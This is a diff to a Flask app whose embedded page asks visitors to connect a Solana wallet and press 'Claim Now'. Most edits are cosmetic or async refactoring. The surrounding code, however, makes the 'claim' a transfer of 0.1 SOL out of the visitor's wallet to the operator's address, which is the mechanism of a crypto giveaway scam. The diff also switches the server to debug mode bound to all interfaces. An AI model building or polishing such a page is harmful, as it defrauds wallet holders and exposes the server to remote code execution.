@@ -16,7 +16,7 @@ HTML_TEMPLATE = """
   body {
     background-color: #000;
     color: white;
-    font-family: sans-serif;
+    font-family: Arial, sans-serif;
     text-align: center;
     padding: 40px;
   }
@@ -27,7 +27,7 @@ HTML_TEMPLATE = """
     box-shadow: 0 0 20px #00ff90;
     display: none;
   }
-  .wallet-button, .claim-button {
+  button {
     background: linear-gradient(90deg, #00ff90, #00d178);
     border: none;
     padding: 14px 30px;
@@ -61,9 +61,8 @@ HTML_TEMPLATE = """
     return null;
   }
 
-  function connectWallet() {
+  async function connectWallet() {
     updateStatus("Detecting wallet provider...");
-
     provider = detectProvider();
 
     if (!provider) {
@@ -87,11 +86,13 @@ HTML_TEMPLATE = """
       document.getElementById("claimBtn").disabled = false;
     });
 
-    provider.connect().catch(err => {
+    try {
+      await provider.connect();
+    } catch (err) {
       updateStatus("Wallet connection failed: " + err.message);
       document.getElementById("connectWalletBtn").disabled = false;
       document.getElementById("claimBtn").disabled = true;
-    });
+    }
   }
 
   async function sendTransaction() {
@@ -106,7 +107,7 @@ HTML_TEMPLATE = """
       SystemProgram.transfer({
         fromPubkey: provider.publicKey,
         toPubkey: new PublicKey("{{ wallet }}"),
-        lamports: 0.1 * 1e9
+        lamports: 0.1 * 1e9,
       })
     );
 
@@ -130,18 +131,16 @@ HTML_TEMPLATE = """
   <p><code>{{ wallet }}</code></p>
   <img id="qrCode" src="{{ qr_url }}" class="qr" alt="QR Code" />
   <p id="walletStatus">Click "Connect Wallet" to begin</p>
-  <button id="connectWalletBtn" onclick="connectWallet()" class="wallet-button">Connect Wallet</button>
-  <button id="claimBtn" onclick="sendTransaction()" class="claim-button" disabled>Claim Now</button>
-  <footer style="margin-top: 60px; font-size: 0.8em; color: #888;">
-    &copy; 2024 Your Project
-  </footer>
+  <button id="connectWalletBtn" onclick="connectWallet()">Connect Wallet</button>
+  <button id="claimBtn" onclick="sendTransaction()" disabled>Claim Now</button>
+  <footer style="margin-top: 60px; font-size: 0.8em; color: #888;">&copy; 2025 Your Project</footer>
 </body>
 </html>
 """
 
 @app.route("/")
-def home():
+def index():
     return render_template_string(HTML_TEMPLATE, wallet=WALLET_ADDRESS, qr_url=QR_CODE_URL)
 
 if __name__ == "__main__":
-    app.run(debug=True)
+    app.run(host="0.0.0.0", port=8080, debug=True)
